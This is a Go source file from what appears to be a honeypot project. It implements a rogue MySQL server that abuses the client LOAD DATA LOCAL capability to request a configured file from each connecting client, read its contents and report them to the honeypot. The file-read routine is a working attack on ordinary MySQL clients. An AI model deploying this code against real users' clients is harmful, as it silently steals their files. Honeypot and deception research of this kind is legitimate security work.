package mysql

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/panjf2000/ants"
	"net"
	"scarletpot/report"
	"scarletpot/utils/conf"
	"scarletpot/utils/log"
	"scarletpot/utils/pool"
	"strings"
	"sync"
	"syscall"
)

// mysql-server 发送的握手包
var handshakePack = []byte{
	0x4a, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x35, 0x2e, 0x35, 0x33,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x75, 0x51, 0x73, 0x6f, 0x54, 0x36,
	0x50, 0x70, 0x00, 0xff, 0xf7, 0x21, 0x02, 0x00, 0x0f, 0x80, 0x15,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64,
	0x26, 0x2b, 0x47, 0x62, 0x39, 0x35, 0x3c, 0x6c, 0x30, 0x45, 0x4a,
	0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e, 0x61, 0x74, 0x69,
	0x76, 0x65, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64,
	0x00,
}

// mysql-server 回应的OK包
var okPack = []byte{0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}

const bufLength = 1024

var recordClient = make(map[string]int)

var wg sync.WaitGroup
var poolX *ants.Pool

var ip string
var fileNames []string
var filename string

func Start() {
	wg, poolX = pool.New(10)
	defer poolX.Release()

	serverAddr, _ := net.ResolveTCPAddr("tcp", conf.GetBaseConfig().Mysql.Addr)
	listener, _ := net.ListenTCP("tcp", serverAddr)

	// 文件列表 需要在配置文件中，暂时先放在这里 多个文件以逗号隔开
	fileNames = strings.Split(conf.GetBaseConfig().Mysql.File, ",")
	filename = fileNames[0]

	for {
		wg.Add(1)

		poolX.Submit(func() {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("zh-CN", "Mysql", "127.0.0.1", "Mysql 连接失败", err)
			}

			arr := strings.Split(conn.RemoteAddr().String(), ":")
			ip = arr[0]

			//这里记录每个客户端连接的次数，实现获取多个文件
			//_, ok := recordClient[ip]
			//if ok {
			//	if recordClient[ip] < len(fileNames)-1 {
			//		recordClient[ip] += 1
			//	}
			//} else {
			//	recordClient[ip] = 0
			//}

			go connectionHandler(conn)
		})
		wg.Wait()
	}
}

func connectionHandler(conn net.Conn) {
	// 结束后关闭连接
	defer conn.Close()
	var ibuf = make([]byte, bufLength)

	//connFrom := conn.RemoteAddr().String()
	//fmt.Println("收到来自", connFrom, "的连接")
	_, err := conn.Write(handshakePack)
	if err != nil {
		log.Err("zh-CN", "握手包发送失败..")
	}

	// 获取客户端发送的包
	_, err = conn.Read(ibuf[0 : bufLength-1])

	//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
	if (uint8(ibuf[4]) & uint8(128)) == 0 {
		_ = conn.Close()
		fmt.Println("该客户端无法读取文件")
		go report.Do("MySQL", ip, "", "无法读取文件")
		return
	}
	_, err = conn.Write(okPack)
	if err != nil {
		log.Err("zh-CN", "ok包发送失败")
	}
	_, err = conn.Read(ibuf[0 : bufLength-1])
	getFileData := []byte{byte(len(filename) + 1), 0x00, 0x00, 0x01, 0xfb}
	getFileData = append(getFileData, filename...)

	_, err = conn.Write(getFileData)
	getContent(conn)
}

func getContent(conn net.Conn) {
	var content bytes.Buffer
	//先读取数据包长度，前面3字节
	lengthBuf := make([]byte, 3)
	_, err := conn.Read(lengthBuf)
	if err != nil {
		panic(err)
	}
	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
	if totalDataLength == 0 {
		return
	}
	//丢掉1字节的序列号
	_, _ = conn.Read(make([]byte, 1))

	ibuf := make([]byte, bufLength)
	totalReadLength := 0
	//循环读取直到读取的长度达到包长度
	for {
		length, err := conn.Read(ibuf)
		switch err {
		case nil:
			//如果本次读取的内容长度+之前读取的内容长度大于文件内容总长度，则本次读取的文件内容只能留下一部分
			if length+totalReadLength > totalDataLength {
				length = totalDataLength - totalReadLength
			}
			content.Write(ibuf[0:length])
			totalReadLength += length
			if totalReadLength == totalDataLength {
				// 上报信息至蜜罐
				go report.Do("MySQL", ip, "", filename+"\n"+content.String())
				fmt.Println(content.String())
				_, _ = conn.Write(okPack)
			}
		case syscall.EAGAIN: // try again
			continue
		default:
			//arr := strings.Split(conn.RemoteAddr().String(), ":")
			//log.Warn("zh-CN", "Mysql "+arr[0]+" 已经关闭连接")
			wg.Done()
			return
		}
	}
}
